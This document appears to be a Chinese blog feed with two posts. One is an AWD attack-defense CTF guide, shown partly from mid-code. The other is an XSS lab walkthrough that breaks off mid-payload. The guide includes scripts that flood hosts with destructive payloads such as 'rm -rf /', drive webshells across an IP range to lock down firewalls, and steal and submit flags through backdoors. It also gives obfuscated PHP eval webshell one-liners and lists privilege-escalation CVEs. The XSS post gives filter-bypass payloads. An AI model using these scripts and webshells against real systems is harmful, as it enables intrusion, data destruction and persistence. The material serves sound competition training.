&#39;r&#39;).read()                except Exception, e:                    break                if Special_string not in f:                    try:                        print u&#39;[*] webshell find : &#39; + getUnicode(filepath)                        shutil.move(filepath, os.path.join(Special_path[&#39;webshell&#39;], ntpath.basename(filepath) + &#39;.txt&#39;))                    except Exception as e:                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filepath)                    try:                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)                        f.write(&#39;newfile: &#39; + getUnicode(filepath) + &#39; : &#39; + str(time.ctime()) + &#39;\\n&#39;)                        f.close()                    except Exception as e:                        print u&#39;[-] log error : file move error: &#39; + getUnicode(e)        # 防止任意文件被修改,还原被修改文件        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)        for filekey in md5_dict:            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:                try:                    f = open(filekey, &#39;r&#39;).read()                except Exception, e:                    break                if Special_string not in f:                    try:                        print u&#39;[*] file had be change : &#39; + getUnicode(filekey)                        shutil.move(filekey, os.path.join(Special_path[&#39;difffile&#39;], ntpath.basename(filekey) + &#39;.txt&#39;))                        shutil.move(os.path.join(Special_path[&#39;bak&#39;], ntpath.basename(filekey)), filekey)                    except Exception as e:                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filekey)                    try:                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)                        f.write(&#39;diff_file: &#39; + getUnicode(filekey) + &#39; : &#39; + getUnicode(time.ctime()) + &#39;\\n&#39;)                        f.close()                    except Exception as e:                        print u&#39;[-] log error : done_diff: &#39; + getUnicode(filekey)                        pass        time.sleep(2)        # print &#39;[*] &#39; + getUnicode(time.ctime())</code></pre><p>运行</p><pre><code>python jiankong.py  /var/www/html</code></pre><h2 id="alias起别名"><a href="#alias起别名" class="headerlink" title="alias起别名"></a>alias起别名</h2><pre><code>alias cat=&quot;echo nothing&quot;</code></pre><p>删除</p><pre><code>unalias -a</code></pre><p>对方执行cat /flag命令的时候回显就是错误flag</p><pre><code>alias cat=&quot;echo `date`|md5sum|cut -d &#39; &#39; -f1||&quot;</code></pre><p>获取 flag 一般是 curl <a href="http://xxx.com/flag.txt">http://xxx.com/flag.txt</a></p><pre><code>alias curl=&#39;echo fuckoff&#39; #权限要求较低，可以在这里改成虚假的flag# 或者chmod -x curl #权限要求较高/usr/bin curl路径</code></pre><h2 id="杀不死马"><a href="#杀不死马" class="headerlink" title="杀不死马"></a>杀不死马</h2><p>查看进程</p><pre><code>root@1177499f5b23:~# ps aux | grep www-datawww-data  4819  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUNDwww-data  6663  0.0  0.6 316188 13460 ?        S    Dec16   0:00 apache2 -D FOREGROUNDwww-data  6675  0.0  0.3 315620  6976 ?        S    Dec16   0:00 apache2 -D FOREGROUNDwww-data  6690  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUNDwww-data  6693  0.0  0.4 315800  9056 ?        S    Dec16   0:00 apache2 -D FOREGROUNDwww-data  7170  0.0  0.6 316312 14100 ?        S    Dec16   0:00 apache2 -D FOREGROUNDwww-data  7239  0.0  0.6 316172 14020 ?        S    Dec16   0:00 apache2 -D FOREGROUNDwww-data  7526  0.0  0.4 315620  8364 ?        S    Dec16   0:00 apache2 -D FOREGROUNDwww-data  8380  0.0  0.6 316188 12612 ?        S    Dec16   0:00 apache2 -D FOREGROUNDwww-data 22554  0.0  0.3 315564  7416 ?        S    03:10   0:00 apache2 -D FOREGROUNDroot     25353  0.0  0.0   8868  1544 pts/1    S+   05:25   0:00 grep --color=auto www-data</code></pre><p>(1)杀进程</p><pre><code>kill -9 对应的进程号</code></pre><p>执行命令</p><pre><code>ps aux | grep www-data | awk &#39;&#123;print $2&#125;&#39; | xargs kill -9ps aux | grep www-data | grep -v grep | awk &#39;&#123;print $2&#125;&#39; | xargs kill -9</code></pre><p>原理</p><pre><code>ps aux列出进程信息grep www-data在进程信息中找到需要杀死的进程grep -v grep在进程信息中剔除带grep的信息awk ‘&#123;print $2&#125;’提取字符串行内容的第2个字段，也就是当前示例的进程号xargs kill -9将进程号作为参数传递给kill -9这个命令</code></pre><p>然后删除不死马文件</p><p>(2)重启php等web服务，不推荐使用</p><pre><code>service php-fpm restart</code></pre><p>(3)用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p><pre><code>&lt;?phpwhile (1) &#123;    $pid=1234;  #不死马进程    @unlink(&#39;demo.php&#39;);    exec(&#39;kill -9 $pid&#39;);&#125;?&gt;&lt;?php    ignore_user_abort(true);    set_time_limit(0);    unlink(__FILE__);    $file = &#39;.3.php&#39;;    $code = &#39;hi springbird !&#39;;    //pass=pass    while (1)&#123;        file_put_contents($file,$code);        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#39;);    //    usleep(5000);          usleep(1000);    &#125;?&gt;</code></pre><p>(4)创建一个和不死马生成的马一样名字的文件夹 mkdir 1.php</p><p>循环创建</p><pre><code>#!/bin/bashdire=&quot;/var/www/html/.base.php/&quot;file=&quot;/var/www/html/.base.php&quot;rm -rf $filemkdir $dire./xx.sh</code></pre><h2 id="清除反弹shell"><a href="#清除反弹shell" class="headerlink" title="清除反弹shell"></a>清除反弹shell</h2><p>查看进程</p><pre><code>ps -ef / px -aux</code></pre><p>出现www-data权限的/bin/sh一般为nc</p><p>然后杀进程</p><pre><code>kill `ps -aux | grep www-data | grep apache2 | awk &#39;&#123;print $2&#125;&#39;`</code></pre><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在AWD中，一般都需要专门防御加固自己服务器的环节，但加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般只会给一个普通权限账号，这时候往往就需要给服务器提权了。</p><p>关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。</p><p>影响范围比较大的漏洞，可以用来提权：</p><pre><code>CVE-2017-6074 (DCCP双重释放漏洞 &gt; 2.6.18 ) ：DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务(系统崩溃)或者提升权限，获得系统的管理访问权限CVE-2016-5195(脏牛，kernel 2.6.22 &lt; 3.9 (x86/x64)) ：低权限用户可修改root用户创建的文件内容，如修改 /etc/passwd，把当前用户的 uid 改成 0 即可提升为root权限CVE-2016-8655(Ubuntu 12.04、14.04，Debian 7、8) ：条件竞争漏洞，可以让低权限的进程获得内核代码执行权限POC：&lt;https://www.seebug.org/vuldb/ssvid-92567&gt;CVE-2017-1000367(sudo本地提权漏洞 ) ：Linux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。CVE-2016-1247(Nginx权限提升漏洞) ：Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx/web 的用户权限 www-data 到 root 用户权限的提升。POC：&lt;https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html&gt;</code></pre><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>基本原则</p><ul><li>能修复的尽量修复；</li><li>不能修复的先注释源码，不影响页面显示再删除；</li><li>站点和对应的功能尽可能不宕机；</li></ul><p>技巧</p><ul><li>设置 waf，如 load_file；</li><li>对于一些成型的 CMS，找到相应版本号后，对其 diff；</li><li>修改弱口令用户；</li><li>对于觉得危险函数的地方直接使用die()；</li></ul><p>比如文件上传漏洞修复，可以在upload目录下写.htaccess禁止php文件执行</p><pre><code>&lt;Directory &quot;/var/www/html/upload&quot;&gt;Options -ExecCGI -IndexesAllowOverride NoneRemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtmlRemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtmlphp_flag engine off&lt;FilesMatch &quot;.+\\.ph(p[3457]?|t|tml)$&quot;&gt;deny from all&lt;/FilesMatch&gt;&lt;/Directory&gt;</code></pre><p>一些修复技巧参考：<a href="https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/">AWD攻防赛之各类漏洞FIX方案 | Qftm</a></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>命令行动态查看日志</p><pre><code>tailf /var/log/apache2/access.log</code></pre><p>还可以使用工具进行日志分析：<a href="https://security.tencent.com/index.php/opensource/detail/15">LogForensics 腾讯实验室 /web日志取证分析工具</a></p><p>日志的存放地址</p><pre><code>/var/log/apache2//usr/local/apache2/logs/usr/nginx/logs/</code></pre><p>为了对其他防守方进行干扰，可以利用脚本发生大量垃圾数据包，混淆视觉，给对方人员增加检测的难度，浪费对方的时间。</p><pre><code>import requestsimport timedef scan_attack():    file=&#123;&#39;shell.php&#39;,&#39;admin.php&#39;,&#39;web.php&#39;,&#39;login.php&#39;,&#39;1.php&#39;,&#39;index.php&#39;&#125;    payload=&#123;&#39;cat /flag&#39;,&#39;ls -al&#39;,&#39;rm -f&#39;,&#39;echo 1&#39;,&#39;echo 1 /proc/sys/net/ipv4/ip_forward&#39;,&#39;rm -rf / --no-preserve-root&#39;&#125;    while(1):        for i in range(1, 50):            for ii in file:                url=&#39;&lt;http://192.168.182&gt;.&#39;+ str(i)+&#39;/&#39;+ii                print(url)                for iii in payload:                    data=&#123;                        &#39;payload&#39;:iii                    &#125;                    try:                        requests.post(url,data=data)                        print(&quot;正在搅屎:&quot;+str(i)+&#39;|&#39;+ii+&#39;|&#39;+iii)                        time.sleep(0.1)                    except Exception as e:                        time.sleep(0.1)                        passif __name__ == &#39;__main__&#39;:    scan_attack()</code></pre><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>在比赛服务器上抓取流量包，需要的权限比较高，一般比赛用不到</p><pre><code>sudo tcpdump -s 0 -w flow.pcap port 80# 然后使用 scp 写个脚本实时将流量包拷贝到本地tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap命令拆解分析：1、tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型2、-i eth1 : 只抓经过接口eth1的包3、-t : 不显示时间戳4、-s 0 : 抓取数据包时默认抓取长度为68字节。加上-S 0 后可以抓到完整的数据包5、-c 100 : 只抓取100个数据包6、dst port ! 22 : 不抓取目标端口是22的数据包7、src net 192.168.1.0/24 : 数据包的源网络地址为192.168.1.0/248、-w ./target.cap : 保存成cap文件，方便用wireshark分析</code></pre><p>PHP版流量监控</p><pre><code>&lt;?php  date_default_timezone_set(&#39;Asia/Shanghai&#39;);$ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; //记录访问者的ip$filename = $_SERVER[&#39;PHP_SELF&#39;]; //访问者要访问的文件名$parameter = $_SERVER[&quot;QUERY_STRING&quot;]; //访问者要请求的参数$time = date(&#39;Y-m-d H:i:s&#39;,time()); //访问时间$logadd = &#39;来访时间：&#39;.$time.&#39;--&gt;&#39;.&#39;访问链接：&#39;.&#39;http://&#39;.$ip.$filename.&#39;?&#39;.$parameter.&quot;\\r\\n&quot;;// log记录$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);fwrite($fh, $logadd);fclose($fh);?&gt;</code></pre><p>一个针对php的web流量抓取、分析的应用：<a href="https://github.com/wupco">wupco</a>/<a href="https://github.com/wupco/weblogger">weblogger</a></p><p>使用方法</p><pre><code>cd /var/www/html/ (or other web dir)   git clone &lt;https://github.com/wupco/weblogger.git&gt;   chmod -R 777 weblogger/   open &lt;http://xxxxx/weblogger/install.php&gt; in Web browser   install it</code></pre><h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>waf的作用：</p><p>1.最重要是分析流量，别人攻击我们的时候，我们可以看到别人的攻击方式。这样的话即使我们找 不到攻击点，非常苦恼的时候，我们就可以分析流量，使用别人的攻击方式。</p><p>2.可以直接进行防御，类似于一台防火墙（一般的比赛是不允许使用的，毕竟比赛时间短，就根本绕不过去waf，那比赛就没意思了）</p><p>有些比赛是不允许上通用waf的，check机制可能会check到waf过滤的参数，导致宕机，waf部署需要谨慎，还需要注意的是：上完waf检查服务是否可用，部分检查允许使用部分小的waf，会检查页面完整性、服务完整性。</p><p>常用的waf使用方法，是用你要保护的文件去包含这个waf.php。比如说，你要保护select.php，那么你就在select.php里面写上一行include ‘./waf.php’或者 require_once(‘waf.php’);</p><p>如果你要保护所有文件，那么就在config这种配置文件里包含waf，因为这种config的文件，一般会被大部分功能页面调用</p><p>网上很多waf脚本，这里介绍几个waf项目</p><p><strong>1.AWD_PHP_WAF</strong></p><p>项目地址：<a href="https://github.com/NonupleBroken/AWD_PHP_WAF">GitHub - NonupleBroken/AWD_PHP_WAF: a PHP WAF for AWD</a></p><p>使用方法：</p><p>使用前先修改config.php内的密码，密码使用sha256加密</p><pre><code>上waf：$ find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xargs sed -i &quot;s/&lt;?php/&lt;?php include_once(\\&quot;\\/var\\/www\\/html\\/waffffff\\/waf.php\\&quot;);/g&quot;下waf：$ find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xargs sed -i &quot;s/&lt;?php include_once(\\&quot;\\/var\\/www\\/html\\/waffffff\\/waf.php\\&quot;);/&lt;?php/g&quot;</code></pre><p>比如访问 web 目录下的/waffffff/admin.php?password=123456</p><p><strong>2.CTF-WAF</strong></p><p>项目地址：<a href="https://github.com/sharpleung/CTF-WAF">GitHub - sharpleung/CTF-WAF: 针对CTF线下赛的通用WAF,带流量转发，日志审计功能。</a></p><p><strong>3.awd-watchbird</strong></p><p>这是个通防waf，支持流量转发和替换flag</p><p>项目地址：<a href="https://github.com/leohearts/awd-watchbird">GitHub - leohearts/awd-watchbird: A powerful PHP WAF for AWD</a></p><p>1.打包好好之后直接上传到html目录下，回到终端，在上传的waf目录下，使用命令</p><pre><code>php watchbird.php --install /var/www/html</code></pre><p>这样就能使每个页面的php代码包含到waf下</p><p>2.运行waf 之后，打开我们的web 页面，在任意一个php 页面后面输入?watchbird=ui，就会进入到waf 配置页面然后设置密码(注意：第一次打开需要设置密码)</p><p>3.配置好之后就能进入内部网页</p><p><strong>4.AoiAWD</strong></p><p>项目地址：<a href="https://github.com/DasSecurity-HatLab/AoiAWD">GitHub - DasSecurity-HatLab/AoiAWD: AoiAWD-专为比赛设计，便携性好，低权限运行的EDR系统。</a></p><p>使用方法：<a href="https://www.wlhhlc.top/posts/16692/">AoiAWD-萌新的得分利器</a></p><p>下载好，自己去编译或者找编译好的直接用</p><h2 id="防御搅屎"><a href="#防御搅屎" class="headerlink" title="防御搅屎"></a>防御搅屎</h2><p>在加固阶段，每个堡垒机都有一个Web在运行。而这些站点可能存在相应的漏洞和后门。基本上都会有shell留在隐秘的角落…</p><p>所以我们就可以通过前期搜寻到的后门，进行操作。这里直接用linux的防火墙进行关闭即可。</p><p>在正常情况下：这样的话就直接把系统的后门全杀掉了。只允许22 80 21端口可以进行访问。</p><p>首先开启 22 80 21</p><pre><code>iptables -A INPUT -p tcp --dport 80 -j ACCEPTiptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A INPUT -p tcp --dport 21 -j ACCEPT</code></pre><p>然后关闭</p><pre><code>iptables -A INPUT -j DROP</code></pre><p>在手动一个个连shell搅shi的话，是非常慢的。于是写了个小脚本。</p><p>遍历整个IP段，并将防火墙开启全部屏蔽掉~~</p><pre><code>import requestsurl = &quot;&lt;http://192.168.182&gt;&quot;port=&#39;80&#39;shell = &quot;/shell.php&quot;passwd = &quot;a&quot;payloads = &#123;    passwd:&quot;system(\\&#39;iptables -A INPUT -j DROP&#39;);&quot;&#125;for i in range(1,254):    urls = url+&quot;.&quot;+str(i)+&quot;:&quot;+port+shell    print(urls+&quot;\\n&quot;)    try:        res = requests.post(urls,payloads,timeout=1)        print(res.text)    except:        print(&quot;未找到主机&quot;)</code></pre><h1 id="编写批量脚本"><a href="#编写批量脚本" class="headerlink" title="编写批量脚本"></a>编写批量脚本</h1><p>以下脚本来自于我比赛时写的垃圾脚本，大佬勿喷。</p><h3 id="1-利用后门getflag"><a href="#1-利用后门getflag" class="headerlink" title="1.利用后门getflag"></a>1.利用后门getflag</h3><p>单个shell获取flag</p><pre><code>import requestsurl=&quot;&lt;http://192.168.182.130/include/shell.php&gt;&quot;passwd=&quot;admin_ccmd&quot;payload = &#123;passwd: &#39;system(\\&#39;cat /f*\\&#39;);&#39;&#125;res=requests.post(url,payload)print(res.text)</code></pre><h3 id="2-后门批量getflag"><a href="#2-后门批量getflag" class="headerlink" title="2.后门批量getflag"></a>2.后门批量getflag</h3><p>针对端口变化利用后门批量获取flag</p><pre><code>import requestsurl1=&quot;&lt;http://192.168.182.130&gt;:&quot;url2=&quot;&quot;flaglist=[]path=&quot;/include/shell.php&quot;passwd=&quot;admin_ccmd&quot;#payload = &#123;passwd: &#39;system(\\&#39;cat /f*\\&#39;);&#39;&#125;payload = &#123;passwd: &#39;system(\\&#39;cat /flag\\&#39;);&#39;&#125;i = 0for url2 in range(8801,8805):    url = url1 + str(url2) +path    res=requests.post(url,payload)    try:        print(url1 + str(url2),res.text)        # flag存入列表中        flaglist.append(str(res.text))        #print(flaglist[i])        i += 1    except:        pass</code></pre><h3 id="3-利用后门批量getflag并提交"><a href="#3-利用后门批量getflag并提交" class="headerlink" title="3.利用后门批量getflag并提交"></a>3.利用后门批量getflag并提交</h3><p>burp抓包，发现flag以json形式传输</p><pre><code>POST /api/flag HTTP/1.1Host: 192.168.182.130:39999User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0Accept: application/json, text/plain, */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/json;charset=utf-8Authorization: 9ad36c305d6a2d2514434a4c10e7e13fContent-Length: 55Origin: &lt;http://192.168.182.130:39999&gt;Connection: closeReferer: &lt;http://192.168.182.130:39999/&gt;&#123;&quot;flag&quot;:&quot;SL&#123;7a2ecc20361b7a104798b6bba6222b3972e114a2&#125;&quot;&#125;</code></pre><p>编写脚本自动获取flag并提交</p><pre><code># coding: UTF-8import requestsimport jsonurl1=&quot;&lt;http://xxxx&gt;:&quot;url2=&quot;&quot;flaglist=[]path=&quot;/include/shell.php&quot;passwd=&quot;admin_ccmd&quot;flagadd=&quot;&lt;http://xxxx:8801/api/flag&gt;&quot;   #提交flag的地址#payload = &#123;passwd: &#39;system(\\&#39;cat /f*\\&#39;);&#39;&#125;payload = &#123;passwd: &#39;system(\\&#39;cat /flag\\&#39;);&#39;&#125;headers=&#123;        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#39;,    &#125;headersflag=&#123;        &#39;Host&#39;: &#39;xxxx&#39;,        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#39;,        &#39;Accept&#39;: &#39;application/json, text/plain, */*&#39;,        &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#39;,        &#39;Content-Type&#39;: &#39;application/json;charset=utf-8&#39;,        &#39;Authorization&#39;: &#39;bada82467423a6526d4d25abbe8cc43a&#39;,        &#39;Origin&#39;: &#39;&lt;http://xxxx&gt;&#39;,        &#39;Referer&#39;: &#39;&lt;http://xxxx/&gt;&#39;,    &#125;i = 0for url2 in range(8802,8810):    url = url1 + str(url2) +path    #print(url1 + str(url2))    res=requests.post(url,payload, headers=headers)    try:        print(url1 + str(url2),res.text)        # flag存入列表中        flaglist.append(str(res.text))        #print(flaglist[i])        body = &#123;&quot;flag&quot;: str(flaglist[i])&#125;        res = requests.post(flagadd, headers=headersflag, data=json.dumps(body))        i += 1    except:        pass</code></pre><p>如果嫌写脚本麻烦，可以把flag存入字典，利用burp爆破，也可以实现批量提交flag。不过大括号<code>&#123;&#125;</code>可能会被编码导致flag错误。</p><h3 id="4-利用后门写shell"><a href="#4-利用后门写shell" class="headerlink" title="4.利用后门写shell"></a>4.利用后门写shell</h3><p>预留后门可能会被删除，要想持续拿分需要写shell，这里利用命令执行和代码执行来写马</p><p><strong>利用命令执行写马</strong></p><pre><code>1.Linux下写shell$ echo &quot;&lt;?php @eval(\\$_POST[123]); ?&gt;&quot; &gt; webshell.php$ echo PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg==|base64 -d &gt; webshell.php   #base64编码绕过$ echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php #xxd绕过2.windows下写shell&gt;echo ^&lt;?php eval($^_POST[123]); ?^&gt; &gt; webshell.php</code></pre><p><strong>利用代码执行写马</strong></p><pre><code>?code=fputs(fopen(&#39;./webshell.php.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[123]);?&gt;&#39;);?code=file_put_contents(&#39;webshell.php.php&#39;, &#39;&lt;?php @eval($_POST[123]); ?&gt; &#39;);?code=file_put_contents($_POST[f], $_POST[d]);post: f=webshell.php&amp;d=&lt;?php @eval($_POST[123]); ?&gt;</code></pre><p>然后利用脚本实现</p><pre><code># coding: UTF-8import requestsurl = &quot;&lt;http://192.168.182.130:8808&gt;&quot;shell_path = url + &quot;/include/shell.php&quot;shell_passwd = &quot;admin_ccmd&quot;#利用预留后门payload = &#123;shell_passwd: &#39;system(\\&#39;cat /f*\\&#39;);&#39;&#125;res = requests.post(shell_path, payload)print(res.text)#payload1利用预留后门上传shellpayload1 = &#123;shell_passwd: &#39;system(\\&#39;echo &quot;&lt;?php @eval(\\$_POST[atkx]);?&gt;&quot; &gt; /var/www/html/atkx.php\\&#39;);&#39;&#125;res = requests.post(shell_path, payload1)print(&quot;shell已上传&quot;)#payload2利用预留后门上传shell，并getflagmy_shell_path = url + &quot;/atkx.php&quot;my_shell_passwd = &quot;atkx&quot;payload2 = &#123;my_shell_passwd: &#39;system(\\&#39;cat /f*\\&#39;);&#39;&#125;res = requests.post(my_shell_path, payload2)print(res.text)</code></pre><p>批量后门写shell</p><pre><code>import requestsurl_head=&quot;&lt;http://192.168.182.130&gt;&quot;for url2 in range(8801,8805):    try:        url =  url_head+&quot;:&#123;&#125;&quot;.format(url2)        shell_path = url + &quot;/include/shell.php&quot;        shell_passwd = &quot;admin_ccmd&quot;        print(shell_path)        #payload1利用预留后门上传shell        payload1 = &#123;shell_passwd: &#39;system(\\&#39;echo &quot;&lt;?php @eval(\\$_POST[atkx]);?&gt;&quot; &gt; /var/www/html/atkx1.php\\&#39;);&#39;&#125;        res = requests.post(shell_path, payload1)        print(url + &quot; shell写入成功！！！！！！！&quot;)        #        # #payload2通过上传的shell来getflag        # my_shell_path = url + &quot;/atkx1.php&quot;        # my_shell_passwd = &quot;atkx&quot;        # payload2 = &#123;my_shell_passwd: &#39;system(\\&#39;cat /flag\\&#39;);&#39;&#125;        # res = requests.post(my_shell_path, payload2)        # print(url,res.text)    except:        pass</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少。</p><p>2.AWD一般使用的是cms，尽量多收集一些cms的POC和EXP，以备不时之需。</p><p>3.防守注意查看日志看别人是怎么攻击自己的，然后尝试攻击其他人，为了干扰别人，可以先打一波流量，混淆视听。</p><p>4.检查后门，保证自己的网站上没有d盾可以扫出来的后门，检查计划任务或者可疑进程。</p><p>5.比赛一轮大概几分钟，时间比较紧张，需要提高自己的代码审计能力以及自动化脚本的编写能力，实现自动化攻击。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xss靶场</title>
      <link href="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/07/21/xss%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h2><p>进入第一关，查看页面反馈信息</p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230721213727673.png" alt="image-20230721213727673"></p><p>f12查看网站源码，</p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230721214256934.png" alt="image-20230721214256934"></p><p>发现参数会被插入标题中，所以我们输入一段简单的弹窗代码进行尝试</p><pre><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><p>结果页面弹窗提示我们通关，证明我们输入的参数在被get到的时候没有经过特殊的过滤处理。</p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h2><p>这一关多了搜索框，尝试一下第一关的弹窗代码，发现没有弹窗也没有提示通关，<code>证明输入的内容在被get的时候经过了过滤，代码不生效。</code></p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230721215641260.png" alt="image-20230721215641260"></p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230721220340715.png" alt="image-20230721220340715"></p><p>查看网站源码，发现value值是用双引号闭合的</p><p>闭合value值之后，我们还要闭合掉input标签，我们试一下弹窗代码</p><pre><code>&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230722092957076.png" alt="image-20230722092957076"></p><h2 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h2><p>先按照上一关的playload试试，发现不行，查看源代码</p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230722094256601.png" alt="image-20230722094256601"></p><p>value值用<code>单引号闭合</code>，&lt;&gt;被转义成为字符了</p><p>on触发一个事件</p><pre><code> &#39;onmouseover=&#39;javascript:alert(1)&#39;</code></pre><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230722095314351.png" alt="image-20230722095314351"></p><h3 id="on事件"><a href="#on事件" class="headerlink" title="on事件"></a>on事件</h3><p>onmouseover：</p><p>onclick:</p><h2 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h2><p>尝试playload，进行测试</p><pre><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;script&gt;</code></pre><p>查看网站源代码</p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230722102719549.png" alt="image-20230722102719549"></p><p>发现对keyword的参数中&lt;&gt;替换为空，使用没有&lt;&gt;的payload进行绕过</p><pre><code>&quot; onclick=&#39;javascript:alert(1)&#39;</code></pre><p>成功弹窗</p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h2><p>开始试一下弹窗代码，查看源代码</p><p><img src="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/image-20230722141710392.png" alt="image-20230722141710392"></p><p>发线源代码中限制了<script>标签的使用，再试试on时间</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230722142027718.png" alt="image-20230722142027718"></p><p>on被限制了o_n了，再试试别的</p><h3 id="a-href标签法"><a href="#a-href标签法" class="headerlink" title="a-href标签法"></a><strong>a-href标签法</strong></h3><p>href属性的意思是 当标签<a>被点击的时候，就会触发执行转跳，可以是转跳到一个网站，还可以触发执行一段js代码</p><p>例如：</p><pre><code>&lt;a href=javascript:alert(&#39;x&#39;)&gt;xxx&lt;/a&gt;</code></pre><p>最后构造函数是：</p><pre><code>&quot;&gt;&lt;a href=javascript:alert(&#39;x&#39;)&gt;xxx&lt;/a&gt;</code></pre><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230722142907058.png" alt="image-20230722142907058"></p><h2 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h2><p>跟第五关一样，<script>标签被限制了，on时间函数也被限制了</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230722144301370.png" alt="image-20230722144301370"></p><p>尝试用</p><pre><code>&lt;a href=javascript:alert(&#39;a&#39;)&gt;sss&lt;/a&gt;</code></pre><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230722145133315.png" alt="image-20230722145133315"></p><p><a herf>也被过滤了，再试试别的</p><pre><code>&lt;a hRef=javascript:alert(1)&gt;aa&lt;/a&gt;</code></pre><p>好像没有strtolower函数欸，对吧，你是不是没过滤大小写。</p><p>插入</p><pre><code>&quot;&gt;&lt;a hRef=javascript:alert(1)&gt;aa&lt;/a&gt;</code></pre><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230722150000808.png" alt="image-20230722150000808"></p><h2 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h2><p>跟第六关相似，<script>被过滤了，on时间被过滤了， <herf>也被过滤了</p><p>​        <img src="xss%E9%9D%B6%E5%9C%BA/image-20230722232132664.png" alt="image-20230722232132664">                     </p><p>我们试一下双写绕过</p><pre><code>&quot;&gt;&lt;a hrhrefef=javascript:alert(1)&gt;aa&lt;/a&gt;</code></pre><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723145351825.png" alt="image-20230723145351825"></p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723145226140.png" alt="image-20230723145226140"></p><p>好像script也过滤了，试试双写绕过</p><pre><code>&quot;&gt;&lt;a 